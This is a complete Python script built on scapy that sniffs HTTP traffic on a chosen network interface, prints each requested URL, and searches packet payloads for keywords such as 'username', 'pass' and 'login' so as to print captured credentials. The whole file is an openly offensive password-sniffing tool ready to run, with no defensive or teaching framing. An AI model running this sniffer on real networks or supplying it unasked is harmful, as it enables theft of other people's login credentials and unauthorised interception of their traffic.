import scapy.all as scapy
from scapy.layers import http
import re
import optparse

def taking_args():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest='interface', help='Enter Interface on which you want to sniff passwords (Eg: -i eth0)')
    (options, arguments) = parser.parse_args()
    if(options.interface):
        return options.interface
    else:
        print('[-] You forgot to mention interface use -h or --help for more info')
        exit()

def sniff(interface):
    print('Started Sniffing Packets. Waiting for passwords......\n')
    try:
        scapy.sniff(iface=interface, store=False, prn=throw_sniff)
    except:
        print('[-] Invalid Interface')

def throw_sniff(packet):
    if packet.haslayer(http.HTTPRequest):
        host = re.findall(r"b'(.*?)'", str(packet[http.HTTPRequest].Host))
        path = re.findall(r"b'(.*?)'", str(packet[http.HTTPRequest].Path))
        print("[+] HTTP Request: http://"+host[0]+path[0])
        possible = ['username', 'uname', 'user', 'usr', 'email', 'pwd', 'pass', 'passwd', 'password', 'login', 'Login']
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for element in possible:
                if element in str(load):
                    filtered_load = re.findall(r"b'(.*?)'", str(load))
                    print('\n\n[+] Possible Username and passwords: '+filtered_load[0]+'\n\n')

interface = taking_args()
sniff(interface)
